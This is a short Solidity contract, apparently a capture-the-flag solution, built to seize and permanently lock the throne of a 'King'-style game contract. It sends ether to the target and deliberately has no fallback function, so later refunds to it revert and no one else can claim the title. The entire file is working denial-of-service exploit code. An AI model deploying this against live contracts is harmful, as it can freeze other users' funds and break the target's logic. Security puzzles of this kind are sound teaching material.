// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingDOS {
    // no fallback ;)

    function lockThrone(address king) external payable {
        king.call.value(msg.value)("");
    }
}
